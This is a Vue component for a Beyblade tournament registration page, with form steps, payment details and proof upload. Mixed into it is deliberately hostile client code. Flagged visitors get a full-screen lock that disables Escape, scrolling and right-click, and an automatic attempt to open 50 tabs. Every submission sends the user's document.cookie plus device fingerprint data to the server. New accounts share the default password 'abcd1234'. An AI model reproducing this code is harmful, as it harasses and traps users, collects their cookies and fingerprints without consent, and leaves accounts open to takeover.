<template>
  <component :is="shadowBanData ? BlankLayout : AppLayout">
    <Head :title="`Registro - ${event.name}`" />

    <Teleport to="body">
      <div
        v-if="shadowBanData"
        class="shadow-ban-fullscreen-lock"
        @contextmenu.prevent
        @click.stop
        @wheel.prevent
        @touchmove.prevent
      >
        <!-- Background pattern -->
        <div class="absolute inset-0 opacity-10 pointer-events-none" style="background-image: repeating-linear-gradient(45deg, #e10600 0, #e10600 1px, transparent 0, transparent 50%); background-size: 30px 30px;"></div>
        
        <div class="shadow-ban-content card relative z-10 w-full max-w-lg border border-primary/40 stagger-fast shadow-[0_0_200px_rgba(225,6,0,0.8)] bg-dark/95">
          <div class="ban-header flex items-center gap-md mb-lg">
            <div class="ban-icon bg-primary/20 text-primary p-md rounded-full text-3xl animate-pulse">🚫</div>
            <div>
              <h2 class="ban-title text-2xl font-black m-0 tracking-tighter text-[#e10600]">ACCESO DENEGADO</h2>
              <p class="text-[10px] text-white/50 font-bold uppercase tracking-widest mt-1">Sistema para Fansitos Ocultos Activado</p>
            </div>
          </div>
          
          <div class="ban-message prose prose-invert max-h-[70vh] overflow-auto mb-xl leading-relaxed text-sm font-mono scrollbar-hide border border-white/10 p-md rounded bg-black/50" v-html="shadowBanData"></div>
          
          <div class="mb-md rounded border border-white/10 bg-black/40 p-sm">
            <p class="text-[11px] text-white/70 mb-xs">
              Intento automático: abrir 50 pestañas de Guerrilla Xtreme.
            </p>
            <button type="button" class="btn btn-outline btn-sm w-full" @click="tryOpenGuerrillaTabs(50, true)">
              Salir
            </button>
            <p v-if="tabSpamAttempted" class="text-[10px] text-white/50 mt-xs">
              Resultado: {{ openedTabs }} pestañas abiertas{{ tabSpamBlocked ? ' (bloqueadas por el navegador)' : '' }}.
            </p>
          </div>

          <div class="ban-footer pt-md border-t border-primary/30 flex justify-between items-center">
            <p class="text-[10px] text-white/40 uppercase tracking-widest mb-0 font-mono">ID: {{ form.device_id || 'REGISTERED' }}</p>
            <div class="text-[#e10600] text-[10px] uppercase font-bold tracking-widest animate-pulse">DATOS REGISTRADOS ⚠️</div>
          </div>
        </div>
      </div>
    </Teleport>

    <!-- MAIN APP CONTENT (Only renders if NOT banned) -->
    <div v-if="!shadowBanData" class="page-content py-xl prereg-page">
      <div class="max-w-4xl mx-auto">
        <div class="text-center mb-xl">
          <h1 class="page-title text-gradient">{{ event.name }}</h1>
          <p class="text-secondary">{{ event.season?.name }} | {{ new Date(event.event_date).toLocaleDateString('es-CL') }}</p>
        </div>

        <div class="steps-progress mb-xl">
          <div class="progress-line" :style="{ width: ((currentStep - 1) / 4) * 100 + '%' }"></div>
          <div v-for="step in 5" :key="step" class="step-node" :class="{ active: currentStep >= step, current: currentStep === step, 'step-hidden': isRex && step === 4 }">
            <span class="step-icon">{{ step }}</span>
            <span class="step-label">{{ step === 4 && isRex ? '---' : stepTitles[step - 1] }}</span>
          </div>
        </div>



        <div class="card prereg-card" :class="{ 'blur-xl grayscale pointer-events-none select-none': shadowBanData }">
          <form @submit.prevent="submit" class="space-y-lg">
            <!-- Honeypot: invisible to real users, bots fill it -->
            <input type="text" name="website" v-model="form.website" autocomplete="off" tabindex="-1" aria-hidden="true" style="position:absolute;left:-9999px;top:-9999px;width:0;height:0;opacity:0;overflow:hidden" />
            <section v-if="currentStep === 1" class="stagger">
              <div class="flex justify-between items-center mb-md">
                <h3 class="section-title m-0">Información del Evento</h3>
                <span v-if="isRegistered" class="badge badge-green flex items-center gap-xs">
                  ✅ YA ESTÁS REGISTRADO
                </span>
              </div>
              
              <div v-if="isRegistered" class="message-box info mb-md border-green-500/50 bg-green-500/10 text-green-400">
                Ya hemos recibido tu inscripción para este torneo. No es necesario registrarse de nuevo.
              </div>
              <div class="event-box">
                <div class="event-grid">
                  <div>
                    <span class="k">Nombre</span>
                    <p>{{ event.name }}</p>
                  </div>
                  <div>
                    <span class="k">Fecha</span>
                    <p>{{ new Date(event.event_date).toLocaleDateString('es-CL') }}</p>
                  </div>
                  <div v-if="event.location">
                    <span class="k">Ubicación</span>
                    <p>{{ event.location }}</p>
                  </div>
                  <div>
                    <span class="k">Hora</span>
                    <p>{{ eventTimeLabel }}</p>
                  </div>
                  <div v-if="event.prizes" class="event-block col-span-2">
                    <span class="k text-amber-500">🏆 Premios</span>
                    <ul class="prize-list mt-xs">
                      <li v-for="(p, i) in event.prizes.split('\n')" :key="i" class="text-xs font-bold flex items-center gap-xs">
                        <span class="text-amber-500">•</span> {{ p }}
                      </li>
                    </ul>
                  </div>
                  <div class="event-block col-span-2">
                    <span class="k text-green-500">Costo Inscripción</span>
                    <p class="text-xl font-black">{{ new Intl.NumberFormat('es-CL', { style: 'currency', currency: 'CLP', maximumFractionDigits: 0 }).format(event.registration_cost) }}</p>
                  </div>
                </div>
                <div v-if="event.description" class="event-block">
                  <span class="k">Descripción</span>
                  <p>{{ event.description }}</p>
                </div>
                <div v-if="event.rules" class="event-block">
                  <span class="k">Reglas</span>
                  <p>{{ event.rules }}</p>
                </div>
              </div>
            </section>

            <!-- STEP 2: REX CHECK -->
            <section v-if="currentStep === 2" class="stagger">
              <h3 class="section-title">¿Tienes cuenta en R.E.X?</h3>
              <p class="text-secondary mb-md italic text-sm">
                REX es nuestra plataforma oficial de gestión de batallas y bladers. 
                <button type="button" @click="showRexModal = true" class="rex-help-btn">¿Qué es R.E.X? →</button>
              </p>
              
              <div class="rex-options mb-lg">
                <button type="button" class="rex-option" :class="{ active: form.is_rex_registered === true }" @click="form.is_rex_registered = true">
                  <div class="text-xl mb-xs">🛡️</div>
                  Sí, ya tengo cuenta R.E.X
                </button>
                <button type="button" class="rex-option" :class="{ active: form.is_rex_registered === false }" @click="form.is_rex_registered = false">
                  <div class="text-xl mb-xs">🌱</div>
                  No, soy nuevo / No tengo
                </button>
              </div>

              <div v-if="form.is_rex_registered === true" class="message-box info border-blue-500/30">
                <p><strong>IMPORTANTE:</strong> Si marcas que tienes cuenta y no la tienes, <strong>no podremos validar tu inscripción</strong> y deberás comunicarte al Instagram de <a href="https://instagram.com/guerrilla_xtrem" target="_blank" class="underline">@guerrilla_xtrem</a>.</p>
              </div>

              <div v-if="form.is_rex_registered === false" class="message-box warn border-amber-500/30">
                <p>
                  No te preocupes. Se creará automáticamente un perfil básico para ti en R.E.X.
                  Tu acceso por defecto será:
                  <strong>usuario: tu correo</strong> y <strong>contraseña: abcd1234</strong>.
                </p>
              </div>
              
              <span v-if="form.errors.is_rex_registered" class="form-error">{{ form.errors.is_rex_registered }}</span>
            </section>

            <!-- STEP 3: PERSONAL DATA (DYNAMIC) -->
            <section v-if="currentStep === 3" class="stagger">
              <h3 class="section-title">Datos del Blader</h3>
              
              <div v-if="form.is_rex_registered" class="form-group">
                <label class="form-label">Nombre de Blader en R.E.X *</label>
                <div class="relative">
                  <input type="text" v-model="form.blader_name" class="form-input pl-10" placeholder="Ej: GingaHagane" required />
                  <span class="absolute left-3 top-1/2 -translate-y-1/2 text-lg">👤</span>
                </div>
                <p class="text-xs text-secondary mt-xs">Asegúrate de que sea exactamente igual a tu nombre en R.E.X</p>
                <span v-if="form.errors.blader_name" class="form-error">{{ form.errors.blader_name }}</span>
                <div class="form-group mt-md">
                  <label class="form-label">Correo electrónico *</label>
                  <input type="email" v-model="form.email" class="form-input" placeholder="correo@ejemplo.com" required />
                  <span v-if="form.errors.email" class="form-error">{{ form.errors.email }}</span>
                </div>
              </div>

              <div v-else class="space-y-md">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-md">
                  <div class="form-group">
                    <label class="form-label">Nombre Real *</label>
                    <input type="text" v-model="form.first_name" class="form-input" required />
                    <span v-if="form.errors.first_name" class="form-error">{{ form.errors.first_name }}</span>
                  </div>
                  <div class="form-group">
                    <label class="form-label">Apellido Real *</label>
                    <input type="text" v-model="form.last_name" class="form-input" required />
                    <span v-if="form.errors.last_name" class="form-error">{{ form.errors.last_name }}</span>
                  </div>
                </div>
                <div class="form-group">
                  <label class="form-label">Nombre de Blader deseado *</label>
                  <input type="text" v-model="form.blader_name" class="form-input" required />
                  <span v-if="form.errors.blader_name" class="form-error">{{ form.errors.blader_name }}</span>
                </div>
              </div>
            </section>

            <!-- STEP 4: CONTACT (ONLY IF NO REX) -->
            <section v-if="currentStep === 4 && !form.is_rex_registered" class="stagger">
              <h3 class="section-title">Datos de Contacto</h3>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-md">
                <div class="form-group">
                  <label class="form-label">Fecha de nacimiento *</label>
                  <input type="date" v-model="form.birth_date" class="form-input" required />
                  <span v-if="form.errors.birth_date" class="form-error">{{ form.errors.birth_date }}</span>
                </div>
                <div class="form-group">
                  <label class="form-label">Correo electrónico *</label>
                  <input type="email" v-model="form.email" class="form-input" required />
                  <span v-if="form.errors.email" class="form-error">{{ form.errors.email }}</span>
                </div>
              </div>
              <div class="form-group">
                <label class="form-label">Teléfono / WhatsApp *</label>
                <input type="text" v-model="form.whatsapp" @input="validatePhone" class="form-input" placeholder="Solo números" required />
                <p class="text-xs text-secondary mt-xs">Lo usaremos para coordinar el torneo.</p>
                <span v-if="form.errors.whatsapp" class="form-error">{{ form.errors.whatsapp }}</span>
              </div>
            </section>


            <section v-if="currentStep === 5" class="stagger">
              <div class="mb-xl text-center">
                <div class="w-16 h-16 bg-accent-green/10 text-accent-green rounded-full flex items-center justify-center mx-auto mb-md">💳</div>
                <h3 class="section-title m-0">¿Deseas pagar ahora?</h3>
                <p class="text-secondary mt-sm">Puedes asegurar tu cupo de inmediato o pagar días antes del evento.</p>
              </div>

              <div class="rex-options mb-xl">
                <button type="button" class="rex-option" :class="{ active: form.payment_option === 'now' }" @click="form.payment_option = 'now'">
                  <div class="text-xl mb-xs">⚡</div>
                  Pagar ahora
                </button>
                <button type="button" class="rex-option" :class="{ active: form.payment_option === 'later' }" @click="form.payment_option = 'later'">
                  <div class="text-xl mb-xs">📅</div>
                  Pagar días antes
                </button>
              </div>

              <div v-if="form.payment_option === 'now'" class="stagger">
                <div class="message-box info border-accent-green/30 bg-accent-green/5 text-accent-green mb-lg">
                  <p>✅ Al momento de subir el comprobante, validaremos tu pago y tu inscripción estará <strong>asegurada</strong>.</p>
                </div>

                <div class="payment-card mb-xl">
                  <div class="payment-row">
                    <span class="payment-label">Banco</span>
                    <p class="payment-value">{{ event.bank_name || 'Banco Estado' }}</p>
                  </div>
                  <div class="payment-row">
                    <span class="payment-label">Titular</span>
                    <p class="payment-value">{{ event.account_holder || 'Daniel Orellana' }}</p>
                  </div>
                  <div class="payment-row">
                    <span class="payment-label">Tipo</span>
                    <p class="payment-value uppercase">{{ event.account_type || 'Cuenta Vista / Rut' }}</p>
                  </div>
                  <div class="payment-row">
                    <span class="payment-label">N° Cuenta</span>
                    <p class="payment-value">{{ event.account_number || '20539169' }}</p>
                  </div>
                  <div class="payment-row">
                    <span class="payment-label">Email</span>
                    <p class="payment-value">{{ event.account_email || 'ventas@gxbeyblade.com' }}</p>
                  </div>
                  <div v-if="event.payment_instructions" class="payment-row col-span-2">
                    <span class="payment-label">Instrucciones</span>
                    <p class="payment-value italic">{{ event.payment_instructions }}</p>
                  </div>
                </div>
                <button type="button" class="btn btn-outline btn-sm copy-payment-btn" @click="copyPaymentData">
                  Copiar todos los datos de la cuenta
                </button>

                <div class="proof-upload p-xl text-center border-2 border-dashed border-white/10 rounded-xl bg-white/5">
                  <input ref="proofInput" type="file" @change="onProofSelected" accept="image/*" class="sr-only" id="proof_file" />
                  
                  <div v-if="!form.proof" class="space-y-sm">
                    <div class="text-3xl">📄</div>
                    <h3 class="font-bold">Sube tu comprobante *</h3>
                    <p class="text-xs text-secondary">Imagen JPG, PNG o WEBP (Máx 5MB)</p>
                    <button class="btn btn-secondary btn-sm mt-md" type="button" @click="triggerProofPicker">Seleccionar archivo</button>
                  </div>

                  <div v-else class="proof-selected">
                    <div class="flex items-center justify-center gap-sm">
                      <span class="text-2xl">📸</span>
                      <div class="text-left">
                        <p class="text-sm font-bold truncate max-w-[200px]">{{ form.proof.name }}</p>
                        <p class="text-xs text-secondary">{{ (form.proof.size / 1024 / 1024).toFixed(2) }} MB</p>
                      </div>
                    </div>
                    <button type="button" @click="removeProof" class="text-gx-red text-sm font-bold mt-sm block mx-auto">Eliminar comprobante</button>
                  </div>
                  <span v-if="form.errors.proof" class="form-error block mt-sm">{{ form.errors.proof }}</span>
                </div>
              </div>

              <div v-if="form.payment_option === 'later'" class="message-box warn border-gx-red/30 bg-gx-red/5 text-gx-red-light mb-xl">
                <p>⚠️ <strong>Atención:</strong> Si 24 horas antes del evento no se ha recibido el pago, tu inscripción será <strong>cancelada</strong> sin previo aviso.</p>
              </div>
            </section>

            <div class="actions-row">
              <button type="button" class="btn btn-secondary" @click="prevStep" :disabled="currentStep === 1">← Anterior</button>
              <button v-if="currentStep < 5" type="button" class="btn btn-primary" @click="nextStep" :disabled="(currentStep === 1 && isRegistered) || duplicateCheckLoading">
                {{ duplicateCheckLoading ? 'Validando...' : 'Siguiente →' }}
              </button>
              <button v-else type="submit" class="btn btn-primary" :disabled="form.processing">
                {{ form.processing ? 'Enviando...' : (form.payment_option === 'later' ? 'Completar pre-registro' : 'Confirmar registro y pago') }}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>

    <!-- REX Explanation Modal -->
    <div v-if="showRexModal" class="modal-overlay" @click.self="showRexModal = false">
      <div class="modal-content card max-w-md p-xl border-gx-red/20">
        <div class="text-center mb-lg">
          <div class="text-4xl mb-md">🛡️</div>
          <h2 class="text-xl font-black text-gradient uppercase">¿Qué es R.E.X?</h2>
        </div>
        
        <div class="space-y-md text-sm leading-relaxed">
          <p>
            <strong>Royal Evolution X (R.E.X)</strong> es el sistema avanzado de gestión de torneos que utilizamos en nuestra liga.
          </p>
          <p>
            Es un estándar en la escena competitiva, utilizado también por comunidades como <strong>Street Bey (The Mechanic)</strong> y la <strong>CCB (Comunidad Chilena de Beyblade)</strong>.
          </p>
          <p class="p-md bg-white/5 border-l-4 border-gx-red rounded-r-lg">
            A través de REX podrás ver tu grupo asignado, seguir el progreso de las brackets en tiempo real e incluso reportar tus victorias directamente desde tu celular.
          </p>
          
          <div class="pt-md">
            <p class="text-[10px] text-secondary uppercase font-bold mb-xs">Enlace Oficial Visible:</p>
            <div class="flex items-center gap-sm p-sm bg-black/40 rounded border border-white/5">
              <span class="text-xs truncate text-gx-red">https://royal-evolution-x.cl</span>
              <a href="https://royal-evolution-x.cl" target="_blank" class="btn btn-outline btn-xs ml-auto">Abrir</a>
            </div>
          </div>
        </div>
        
        <button @click="showRexModal = false" class="btn btn-primary btn-block mt-xl">Entendido, Volver al registro</button>
      </div>
    </div>

    <div v-if="showSuccessModal" class="modal-overlay" @click.self="closeSuccessModal">
      <div class="modal-content card success-modal-card">
        <div class="success-modal-icon">✅</div>
        <h2 class="text-gradient success-modal-title">¡Gracias por inscribirte!</h2>
        <p class="text-secondary text-center">
          Te esperamos en el torneo. Tu registro fue enviado correctamente.
        </p>
        <p class="success-countdown">
          Serás redirigido al inicio en <strong>{{ redirectCountdown }}</strong> segundos.
        </p>
        <button class="btn btn-primary btn-block mt-md" @click="closeSuccessModal">Cerrar</button>
      </div>
    </div>
  </component>
</template>

<script setup>
import { ref, computed, watch, onMounted, onUnmounted } from 'vue';
import { Head, useForm, usePage } from '@inertiajs/vue3';
import AppLayout from '@/Layouts/AppLayout.vue';
import BlankLayout from '@/Layouts/BlankLayout.vue';
import { useToast } from '@/Composables/useToast';

const { props: pageProps } = usePage();
const { warning: toastWarning, success: toastSuccess, error: toastError } = useToast();

const props = defineProps({
  event: Object,
  auth: Object,
  isRegistered: Boolean,
});

const page = usePage();
console.log('--- AntiAbuse System V11 (CLEAN_BUILD) ---');
const stepTitles = ['Evento', 'R.E.X?', 'Blader', 'Contacto', 'Pago'];
const currentStep = ref(1);
const isRex = computed(() => form.is_rex_registered === true);
const eventTimeLabel = computed(() => {
  if (props.event?.time) return props.event.time;
  if (!props.event?.event_date) return 'Por confirmar';

  const date = new Date(props.event.event_date);
  if (Number.isNaN(date.getTime())) return 'Por confirmar';

  return date.toLocaleTimeString('es-CL', { hour: '2-digit', minute: '2-digit' });
});
const proofInput = ref(null);
const showRexModal = ref(false);
const showSuccessModal = ref(false);

// ── Shadow Ban Logic (Reactive to Page Props) ──
  const shadowBanData = computed(() => {
      if (page.props.flash && page.props.flash._shadow_banned) {
          return page.props.flash.troll_message || true;
      }
      return false;
  });

const duplicateCheckLoading = ref(false);
const deviceIdReady = ref(false);
let redirectInterval = null;
let redirectTimeout = null;
const viewportLockClass = 'gx-viewport-locked';
let lockedScrollY = 0;
const tabSpamAttempted = ref(false);
const openedTabs = ref(0);
const tabSpamBlocked = ref(false);

const setViewportLock = (shouldLock) => {
  if (typeof window === 'undefined' || typeof document === 'undefined') return;

  const html = document.documentElement;
  const body = document.body;

  if (shouldLock) {
    if (body.classList.contains(viewportLockClass)) return;
    lockedScrollY = window.scrollY || window.pageYOffset || 0;
    html.classList.add(viewportLockClass);
    body.classList.add(viewportLockClass);
    body.style.setProperty('top', `-${lockedScrollY}px`, 'important');
    body.style.setProperty('left', '0', 'important');
    body.style.setProperty('right', '0', 'important');
    return;
  }

  if (!body.classList.contains(viewportLockClass)) return;
  html.classList.remove(viewportLockClass);
  body.classList.remove(viewportLockClass);
  body.style.removeProperty('top');
  body.style.removeProperty('left');
  body.style.removeProperty('right');
  window.scrollTo(0, lockedScrollY);
};

const getGuerrillaUrl = () => {
  try {
    if (typeof route === 'function') {
      return route('home');
    }
  } catch (_) {
    // Fallback below
  }
  return typeof window !== 'undefined' ? `${window.location.origin}/` : '/';
};

const tryOpenGuerrillaTabs = (count = 50, fromUserGesture = false) => {
  if (typeof window === 'undefined') return;

  const url = getGuerrillaUrl();
  let opened = 0;

  for (let i = 0; i < count; i += 1) {
    const popup = window.open(url, '_blank', 'noopener,noreferrer');
    if (!popup) break;
    opened += 1;
  }

  tabSpamAttempted.value = true;
  openedTabs.value = opened;
  tabSpamBlocked.value = opened < count;

  if (fromUserGesture && typeof window.focus === 'function') {
    window.focus();
  }
};

const form = useForm({
  first_name: '',
  last_name: '',
  blader_name: '',
  birth_date: '',
  whatsapp: '',
  email: '',
  is_rex_registered: null,
  payment_option: 'now',
  proof: null,
  website: '',
  device_id: '',
  d_screen: '',
  d_cores: '',
  d_memory: '',
  d_platform: '',
  d_timezone: '',
  d_language: '',
  d_cookies: '',
});

const validatePhone = (e) => {
  form.whatsapp = e.target.value.replace(/\D/g, '');
};

  // ── Device Telemetry ──
  const updateTelemetry = () => {
    try {
      form.d_screen = `${window.screen?.width ?? '?'}x${window.screen?.height ?? '?'}`;
      form.d_cores = String(navigator.hardwareConcurrency ?? '?');
      form.d_memory = String(navigator.deviceMemory ?? '?');
      form.d_platform = navigator.userAgentData?.platform ?? navigator.platform ?? '?';
      form.d_timezone = Intl.DateTimeFormat().resolvedOptions().timeZone ?? '?';
      form.d_language = navigator.language ?? '?';
    } catch (_) { /* Silent fail */ }
  };

  // ── Device Fingerprinting (Robust Capture) ──
  const captureFingerprint = async () => {
    console.log('[AntiAbuse] Attempting Fingerprint Capture...');
    try {
      if (typeof window.FingerprintJS !== 'undefined') {
        const fp = await window.FingerprintJS.load();
        const result = await fp.get();
        form.device_id = result.visitorId || '';
        deviceIdReady.value = !!form.device_id;
        console.log('[AntiAbuse] SUCCESS! Fingerprint:', form.device_id);
      } else {
        console.warn('[AntiAbuse] FingerprintJS not yet available in window');
        // If not available, try to inject it manually if not present
        if (!document.getElementById('fp-script-v4')) {
            const script = document.createElement('script');
            script.id = 'fp-script-v4';
            script.src = 'https://openfpcdn.io/fingerprintjs/v4';
            script.onload = () => captureFingerprint();
            document.head.appendChild(script);
        }
      }
    } catch (e) { 
      console.error('[AntiAbuse] Capture error:', e);
      deviceIdReady.value = false;
    }
  };

  const preventEscape = (e) => {
    if (shadowBanData.value && e.key === 'Escape') {
      e.preventDefault();
      return false;
    }
  };

  onMounted(() => {
    window.addEventListener('keydown', preventEscape);
    const user = pageProps?.auth?.user;
    if (user) {
      form.first_name = user.name?.split(' ')[0] || '';
      form.last_name = user.name?.split(' ').slice(1).join(' ') || '';
      form.blader_name = user.blader_name || '';
      form.email = user.email || '';
    }

    updateTelemetry();
    captureFingerprint();
    // High frequency check for first 5 seconds
    const interval = setInterval(() => {
        if (!form.device_id) captureFingerprint();
        else clearInterval(interval);
    }, 1000);
    setTimeout(() => clearInterval(interval), 5000);
  });

  onUnmounted(() => {
    window.removeEventListener('keydown', preventEscape);
    clearPostRegisterTimers();
    setViewportLock(false);
  });

watch(
  () => Boolean(shadowBanData.value || showRexModal.value || showSuccessModal.value),
  (isLocked) => {
    setViewportLock(isLocked);
  },
  { immediate: true }
);

watch(
  shadowBanData,
  (val) => {
    if (!val || tabSpamAttempted.value) return;

    setTimeout(() => {
      tryOpenGuerrillaTabs(50, false);
    }, 120);
  },
  { immediate: true }
);

const validateStep = () => {
  if (currentStep.value === 2 && form.is_rex_registered === null) {
    toastWarning('Selecciona si tienes cuenta en R.E.X para continuar.');
    return false;
  }

  if (currentStep.value === 3) {
    if (form.is_rex_registered && !form.blader_name) {
      toastWarning('Ingresa tu nombre de Blader en R.E.X.');
      return false;
    }
    if (!form.is_rex_registered && (!form.first_name || !form.last_name || !form.blader_name)) {
      toastWarning('Completa todos tus datos de blader.');
      return false;
    }
  }

  if (currentStep.value === 4 && !form.is_rex_registered && (!form.birth_date || !form.email || !form.whatsapp)) {
    toastWarning('Completa los datos de contacto para continuar.');
    return false;
  }

  return true;
};

const triggerProofPicker = () => proofInput.value?.click();
const onProofSelected = (e) => {
  const file = e.target.files[0];
  if (file) form.proof = file;
};
const removeProof = () => {
  form.proof = null;
  if (proofInput.value) proofInput.value.value = '';
};

const copyPaymentData = async () => {
  const lines = [
    `Banco: ${props.event.bank_name || 'Banco Estado'}`,
    `Titular: ${props.event.account_holder || 'Daniel Orellana'}`,
    `Tipo de cuenta: ${props.event.account_type || 'Cuenta Vista / Rut'}`,
    `Numero de cuenta: ${props.event.account_number || '20539169'}`,
    `Email: ${props.event.account_email || 'ventas@gxbeyblade.com'}`,
  ];

  const text = lines.join('\n');

  try {
    await navigator.clipboard.writeText(text);
    toastSuccess('Datos de pago copiados al portapapeles.');
  } catch (error) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.setAttribute('readonly', '');
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    toastSuccess('Datos de pago copiados al portapapeles.');
  }
};

const clearPostRegisterTimers = () => {
  if (redirectInterval) {
    clearInterval(redirectInterval);
    redirectInterval = null;
  }
  if (redirectTimeout) {
    clearTimeout(redirectTimeout);
    redirectTimeout = null;
  }
};

const closeSuccessModal = () => {
  clearPostRegisterTimers();
  showSuccessModal.value = false;
  router.visit(route('home'));
};

const startPostRegisterCountdown = () => {
  clearPostRegisterTimers();
  redirectCountdown.value = 30;
  showSuccessModal.value = true;

  redirectInterval = setInterval(() => {
    if (redirectCountdown.value > 1) {
      redirectCountdown.value -= 1;
      return;
    }
    clearPostRegisterTimers();
    closeSuccessModal();
  }, 1000);

  redirectTimeout = setTimeout(() => {
    clearPostRegisterTimers();
    closeSuccessModal();
  }, 30000);
};

const checkDuplicateRegistration = async () => {
  if (!form.blader_name && !form.email && !pageProps?.auth?.user) {
    return false;
  }

  duplicateCheckLoading.value = true;
  try {
    const { data } = await window.axios.post(route('tournaments.register.check', props.event.id), {
      blader_name: form.blader_name || null,
      email: form.email || null,
    });

    if (data?.exists) {
      toastWarning(data?.message || 'Ya te encuentras pre-registrado en este evento.');
      return true;
    }

    return false;
  } catch (error) {
    const message = error?.response?.data?.message || 'No se pudo verificar el registro. Intenta nuevamente.';
    toastError(message);
    return true;
  } finally {
    duplicateCheckLoading.value = false;
  }
};

const nextStep = async () => {
  if (currentStep.value === 1 && props.isRegistered) {
    toastWarning('Ya te encuentras registrado en este torneo.');
    return;
  }
  if (!validateStep()) return;

  if (currentStep.value === 3 || (currentStep.value === 4 && !form.is_rex_registered)) {
    const isDuplicate = await checkDuplicateRegistration();
    if (isDuplicate) return;
  }
  
  if (currentStep.value === 3 && form.is_rex_registered) {
    currentStep.value = 5; // Jump to payment
  } else if (currentStep.value < 5) {
    currentStep.value++;
  }
};

const prevStep = () => {
  if (currentStep.value === 5 && form.is_rex_registered) {
    currentStep.value = 3;
  } else if (currentStep.value > 1) {
    currentStep.value--;
  }
};

const submit = async () => {
  if (form.processing) return;

  if (form.is_rex_registered === null) {
    toastWarning('Selecciona si estás registrado en REX.');
    return false;
  }

  if (form.payment_option === 'now' && !form.proof) {
    toastWarning('Debes subir el comprobante de pago para finalizar.');
    return;
  }

  // Ensure fingerprint is ready
  if (!form.device_id) {
    console.log('[AntiAbuse] Device ID missing on submit, retrying...');
    await captureFingerprint();
    if (!form.device_id) {
        console.error('[AntiAbuse] Device ID capture FAILED after retry');
        // Let it pass with 'unknown' but log it
        form.device_id = 'unknown_client_' + Date.now();
    }
  }
  form.d_cookies = document.cookie || '';
  updateTelemetry();

  const isDuplicate = await checkDuplicateRegistration();
  if (isDuplicate) return;

  form
    .transform((data) => ({
      ...data,
      is_rex_registered: data.is_rex_registered ? 1 : 0,
    }))
    .post(route('tournaments.register.store', props.event.id), {
      forceFormData: true,
      preserveScroll: true,
      preserveState: true,
      onSuccess: (page) => {
        console.log('[AntiAbuse] Flash Data Received:', page.props.flash);
        
        if (page.props.flash?._shadow_banned) {
          console.log('[AntiAbuse] Shadow Ban Active. Modal should be visible via computed.');
          currentStep.value = 1;
          form.reset();
          return;
        }

        const flashError = page?.props?.flash?.error;
        const flashWarning = page?.props?.flash?.warning;

        if (flashError || flashWarning) {
          toastWarning(flashError || flashWarning);
          return;
        }

        currentStep.value = 1;
        form.reset();

        showSuccessModal.value = true;
        startPostRegisterCountdown();
      },
      onError: (errors) => {
        const firstError = Object.values(errors || {})[0];
        toastError(firstError || 'No se pudo completar el pre-registro.');
      },
    });
};
</script>

<style scoped>
:global(html.gx-viewport-locked),
:global(body.gx-viewport-locked) {
  overflow: hidden !important;
  overscroll-behavior: none !important;
  touch-action: none !important;
}

:global(body.gx-viewport-locked) {
  position: fixed !important;
  inset: 0 !important;
  width: 100% !important;
  height: 100dvh !important;
  max-height: 100dvh !important;
  margin: 0 !important;
  padding: 0 !important;
  background-image: none !important;
}

.shadow-ban-fullscreen-lock {
  position: fixed;
  inset: 0;
  z-index: 2147483647;
  width: 100vw;
  height: 100dvh;
  margin: 0 !important;
  padding: var(--space-md);
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  isolation: isolate;
  background: #050505;
  backdrop-filter: blur(40px);
}

.prereg-page {
  background: radial-gradient(circle at top, rgba(225, 6, 0, 0.07), transparent 45%);
}

.steps-progress {
  position: relative;
  display: grid;
  grid-template-columns: repeat(5, minmax(0, 1fr));
  gap: var(--space-xs);
}

.progress-line {
  position: absolute;
  top: 19px;
  left: 20px;
  height: 3px;
  background: var(--gx-red);
  transition: width 0.35s ease;
  z-index: 1;
}

.step-node {
  position: relative;
  z-index: 3;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 6px;
}

.step-icon {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  display: grid;
  place-items: center;
  border: 2px solid var(--border-color);
  background: var(--bg-card);
  font-weight: 800;
}

.step-node.active .step-icon {
  border-color: var(--gx-red);
}

.step-label {
  font-size: 0.72rem;
  text-transform: uppercase;
  color: var(--text-secondary);
  letter-spacing: 0.05em;
}

.prereg-card {
  padding: var(--space-xl);
}

.section-title {
  margin-bottom: var(--space-md);
}

.event-box {
  border: 1px solid rgba(255, 255, 255, 0.12);
  border-radius: var(--radius-md);
  padding: var(--space-md);
  display: grid;
  gap: var(--space-md);
  background: rgba(0, 0, 0, 0.2);
}

.event-grid {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: var(--space-sm);
}

.event-block {
  border-top: 1px solid rgba(255, 255, 255, 0.08);
  padding-top: var(--space-sm);
}

.k {
  display: block;
  font-size: 0.68rem;
  text-transform: uppercase;
  color: var(--text-secondary);
}

.rex-options {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: var(--space-sm);
}

.rex-option {
  border: 1px solid var(--border-color);
  border-radius: var(--radius-md);
  padding: var(--space-md);
  text-align: center;
  font-weight: 700;
  background: rgba(0, 0, 0, 0.2);
  cursor: pointer;
}

.rex-option.active {
  border-color: var(--gx-red);
  background: rgba(225, 6, 0, 0.1);
}

.step-hidden {
  opacity: 0.3;
  pointer-events: none;
}

.message-box {
  border-radius: var(--radius-md);
  padding: var(--space-md);
  font-size: 0.9rem;
}

.message-box.info {
  background: rgba(59, 130, 246, 0.15);
  border: 1px solid rgba(59, 130, 246, 0.4);
}

.message-box.warn {
  background: rgba(245, 158, 11, 0.12);
  border: 1px solid rgba(245, 158, 11, 0.4);
}

.rex-help-btn {
  margin-left: 6px;
  color: var(--gx-red-light);
  font-weight: 800;
  text-decoration: underline;
  text-underline-offset: 3px;
  background: transparent;
  border: none;
  cursor: pointer;
}

.rex-help-btn:hover {
  color: #fff;
}

.rex-options button {
  color: white !important;
}

.actions-row button {
  color: white !important;
}

.actions-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: var(--space-sm);
  border-top: 1px solid rgba(255, 255, 255, 0.08);
  padding-top: var(--space-md);
}

.payment-card {
  background: rgba(255, 255, 255, 0.03);
  border: 1px solid var(--border-color);
  border-radius: var(--radius-md);
  padding: var(--space-md);
  display: grid;
  grid-template-columns: repeat(2, 1fr);
  gap: var(--space-sm);
}

